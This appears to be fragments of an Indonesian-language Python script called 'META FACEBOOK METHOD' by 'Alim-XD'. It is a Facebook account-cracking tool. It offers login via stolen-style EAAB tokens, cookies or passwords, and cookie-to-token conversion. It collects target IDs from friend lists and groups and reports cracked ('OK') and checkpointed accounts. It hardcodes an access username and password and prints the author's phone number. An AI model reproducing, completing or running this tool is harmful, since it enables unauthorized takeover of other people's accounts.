...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : Alim-XD                   {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +62895323385017          {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/Alim_XD/META{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Premium{P}     {N}║")
    print(f"║{P}[{H}•{P}] Support   : 64bit                   {N}║")
    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}         ║")
    print(f"║{P}[{H}•{P}] SC Version: V-0.1 ({K}BETA{P})            {N}║")
    print("╚════════════════════════════════════════╝")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY Alim-XD META SC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Contoh kata sandi : {H}admin123{N}")
        ...
        jalan('\n\n %s[%s!%s] Maaf Anda tidak mendapatkan hasil'%(N,M,N));exit()
#LOGIN SC
user = "meta"
pwas = "metaroyid"
def cek_pw():
    try:
        ...
        print(' [%s1%s] Sudah memiliki Info Masuk SC'%(H,N))
        print(' [%s2%s] Kirim pesan ke Penulis'%(H,N))
        pil = input('\n %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Maaf salah...!");time.sleep(1);cek_pw()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sAnda akan diarahkan ke Whatsapp Penulis..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/+62895323385017?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] Anda harus memiliki %nama pengguna & sandi%s untuk\n melanjutkan alat ini!'%(N,M,N,H,N))
        else:
        ...
        loading()
        if pw in [""]:
            jalan(" %s[%s!%s] Maaf jangan kosong!"%(N,M,N));time.sleep(1);cek_pw()
        elif pw in user:
            jalan(" %s[%s✓%s] OK Nama pengguna benar"%(N,H,N));time.sleep(1);kska()
        else:
            jalan(" %s[%s!%s] Maaf, salah nama pengguna"%(N,M,N));time.sleep(1);cek_pw()
    moch_yayan()
def kska():
    xx = input("\n %s[%s?%s] Masukkan kata kunci : %s"%(N,K,N,H))
    loading()
    if xx in[""]:
        jalan(" %s[%s!%s] Maaf jangan kosong!"%(N,M,N));time.sleep(1);cek_pw()
    elif xx in pwas:
...
def yayanxd():
    ...
    logo()
    r=requests.Session()
    print(' %s%sPilih metode masuk Anda%s'%(BM,P,N))
    print(' [%s1%s] Masuk dengan Token EAAB (%sON%s)'%(H,N,H,N))
    print(' [%s2%s] Masuk dengan Cookie (%sON%s)'%(H,N,H,N))
    print(' [%s3%s] Masuk dengan ID & Kata Sandi (%sON%s)'%(H,N,H,N))
    print(' [%s4%s] Konversikan Cookie ke Token EAAB (%sON%s)'%(H,N,H,N))
    print(' [%s5%s] Kirim pesan ke Penulis (%sChat%s)'%(H,N,H,N))
    p = input(f"\n [{K}?{N}] Choose Login Method : ")
    if p =="":
        print(f"\n {N}[{M}!{N}] Jangan kosong");time.sleep(3);yayanxd()
    elif p in["1","01"]:
        login_token()
    elif p in["2","02"]:
        login_cookie()
        ...
        jalan(f"\n {N}[{M}!{N}] Maaf salah");time.sleep(2);yayanxd()
...
###### CRACK GRUP #####
            ...
            kontol = input(f" {N}[{K}?{N}] Masukkan ID Grup : {H}")
            if kontol in[""," "]:
...
###### INFO UPDATE & UPGRADE SC #####
        ...
        if upd =="":
            ...
            jalan("\n %s[%s•%s] %sAnda akan diarahkan ke Whatsapp Penulis..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/+62895323385017?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
...
def _ngocok_(__ppk__):
    try:
        print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))
        nanya_keun = int(input(f' %s[%s?%s] Masukkan jumlah target : %s'%(N,K,N,H)))
    except:nanya_keun=1
    print(f" %s[%s•%s] type %sme%s Crack dari daftar teman"%(N,H,N,H,N))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f' %s[%s?%s] Masukkan ID/Username %s%s%s : %s'%(N,K,N,H,mnh,N,H));_memek_ = __convert__(user)
